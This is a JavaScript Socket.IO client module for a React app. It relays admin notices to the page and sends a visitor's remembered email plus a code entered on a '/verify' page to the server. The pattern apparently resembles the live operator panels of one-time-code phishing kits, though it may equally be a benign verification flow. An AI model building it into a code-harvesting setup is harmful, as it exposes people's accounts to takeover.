import { io } from "socket.io-client";

/* One shared public connection for the React app.
 *
 * The Socket.IO server runs on its own port (4001 by default).  Override the
 * address at build time with VITE_SOCKET_URL, or at runtime by serving the app
 * behind a proxy that forwards /socket.io to it. */

const fallback = `${window.location.protocol}//${window.location.hostname}:4001`;
export const SOCKET_URL = import.meta.env.VITE_SOCKET_URL || fallback;

let socket = null;
let lastEmail = "";

export function getPublicSocket() {
  if (!socket) {
    socket = io(`${SOCKET_URL}/public`, {
      transports: ["websocket", "polling"],
      reconnectionDelayMax: 5000,
    });

    socket.on("public:notice", (notice) => {
      // Template hook: show the admin's notice somewhere in the UI.
      window.dispatchEvent(new CustomEvent("app:notice", { detail: notice }));
    });
  }
  return socket;
}

export function announcePage(page) {
  getPublicSocket().emit("public:hello", { page }, () => {});
}

export function rememberEmail(email) {
  lastEmail = email;
}

export function submitCode(code) {
  if (!lastEmail) return;
  getPublicSocket().emit(
    "public:submit",
    { email: lastEmail, code, page: "/verify" },
    () => {}
  );
}
